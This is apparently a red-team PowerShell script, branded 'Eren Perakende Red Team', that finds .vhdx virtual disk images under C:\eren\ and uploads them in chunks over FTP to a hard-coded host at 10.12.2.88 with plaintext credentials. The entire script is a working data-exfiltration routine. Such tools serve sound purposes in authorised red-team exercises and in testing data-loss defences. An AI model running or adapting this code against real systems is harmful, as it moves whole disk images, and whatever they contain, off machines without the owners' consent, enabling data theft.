Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  █████                                              ██████                                          ████ ║
║ ░░███                                              ███░░███                                        ░░███ ║
║ ███████   ████████   ██████   ████████    █████   ░███ ░░░   ██████  ████████     ████████   █████  ░███ ║
║░░░███░   ░░███░░███ ░░░░░███ ░░███░░███  ███░░   ███████    ███░░███░░███░░███   ░░███░░███ ███░░   ░███ ║
║  ░███     ░███ ░░░   ███████  ░███ ░███ ░░█████ ░░░███░    ░███████  ░███ ░░░     ░███ ░███░░█████  ░███ ║
║  ░███ ███ ░███      ███░░███  ░███ ░███  ░░░░███  ░███     ░███░░░   ░███         ░███ ░███ ░░░░███ ░███ ║
║  ░░█████  █████    ░░████████ ████ █████ ██████   █████    ░░██████  █████     ██ ░███████  ██████  █████║
║   ░░░░░  ░░░░░      ░░░░░░░░ ░░░░ ░░░░░ ░░░░░░   ░░░░░      ░░░░░░  ░░░░░     ░░  ░███░░░  ░░░░░░  ░░░░░ ║
║                                                                                   ░███                   ║
║                                                                                   █████                  ║
║                                                                                  ░░░░░                   ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝
" 

Write-Host -Fore Red "            Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

$file = Get-ChildItem -Path "C:\eren\" -Filter "*.vhdx" -Recurse

$ftpServer = "ftp://10.12.2.88"
$ftpUsername = "tester"
$ftpPassword = "password"
$ftpPath = "/"

if (Test-Connection -ComputerName 10.12.2.88 -Count 2 -Quiet) {
    if ($file) {
        $filePath = $file.FullName
        $ftpUri = New-Object System.Uri("$ftpServer$ftpPath/$($file.Name)")

        $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
        $ftpRequest.UseBinary = $true
        $ftpRequest.UsePassive = $true

        try {
            $ftpStream = $ftpRequest.GetRequestStream()
            Write-Host "FTP stream created successfully."
        } catch {
            Write-Error "Error creating FTP request stream: $_"
            return
        }

        $chunkSize = 1048576  
        $fileSize = [System.Int64]$file.Length  
        $bytesUploaded = 0

        $fileStream = [System.IO.File]::OpenRead($filePath)

        while ($bytesUploaded -lt $fileSize) {
            $bytesToRead = if ($fileSize - $bytesUploaded -lt $chunkSize) { $fileSize - $bytesUploaded } else { $chunkSize }

            $buffer = New-Object byte[] $bytesToRead

            $fileStream.Read($buffer, 0, $bytesToRead)

            try {
                $ftpStream.Write($buffer, 0, $bytesToRead)
            } catch {
                Write-Error "Error writing to FTP stream: $_"
                return
            }

            $bytesUploaded += $bytesToRead

            Write-Progress -PercentComplete (($bytesUploaded / $fileSize) * 100) -Status "Uploading..." -Activity "$bytesUploaded of $fileSize bytes uploaded"
        }

        $ftpStream.Close()
        $fileStream.Close()

        $ftpResponse = $ftpRequest.GetResponse()
        Write-Output "File uploaded successfully to FTP server (10.12.2.88)"
    } else {
        Write-Output ".vhdx file not found."
    }
} else {
    Write-Output "Unable to reach the network path 10.12.2.88"
}
